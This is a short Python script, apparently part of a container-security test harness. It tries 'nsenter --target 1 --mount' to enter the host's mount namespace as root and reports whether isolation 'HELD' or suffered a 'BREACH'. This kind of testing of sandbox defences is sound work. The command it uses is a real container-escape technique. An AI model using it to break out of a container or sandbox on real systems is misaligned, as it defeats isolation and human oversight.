#!/usr/bin/env python3
"""Attack: priv_nsenter — Attempt nsenter into host PID namespace"""
import json, subprocess, sys, time

def run():
    result = {"vector": "priv_nsenter", "category": "privilege",
              "status": "HELD", "evidence": "", "duration_ms": 0}
    start = time.time()
    technique = "mount"

    print(json.dumps({"type": "log", "line": f"attempting nsenter --target 1 --{technique}"}))
    sys.stdout.flush()

    try:
        r = subprocess.run(
            ["nsenter", "--target", "1", f"--{technique}", "--", "id"],
            capture_output=True, text=True, timeout=5
        )
        if r.returncode == 0 and "uid=0" in r.stdout:
            result["status"] = "BREACH"
            result["evidence"] = f"nsenter succeeded — host {technique} namespace entered as root"
        else:
            result["evidence"] = f"nsenter failed: {r.stderr.strip()[:80]}"
    except FileNotFoundError:
        result["evidence"] = "nsenter not found in container"
    except subprocess.TimeoutExpired:
        result["evidence"] = "nsenter timed out"
    except PermissionError as e:
        result["evidence"] = f"nsenter permission denied: {e}"
    except Exception as e:
        result["evidence"] = f"error: {e}"

    result["duration_ms"] = int((time.time() - start) * 1000)
    print(json.dumps({"type": "result", **result}))
    sys.stdout.flush()

if __name__ == "__main__":
    run()
